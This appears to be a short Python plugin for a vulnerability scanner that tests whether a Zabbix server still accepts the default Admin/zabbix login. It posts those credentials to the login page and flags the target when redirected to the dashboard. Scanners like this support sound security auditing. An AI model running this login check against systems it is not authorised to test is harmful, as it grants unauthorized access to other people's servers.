#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Zabbix默认口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/index.php'
  data = 'name=Admin&password=zabbix&autologin=1&enter=Sign+in'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 302 and 'zabbix.php?action=dashboard.view' in res.headers['location']:
      ret['huixian'] = f'账号/密码：Admin/zabbix'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret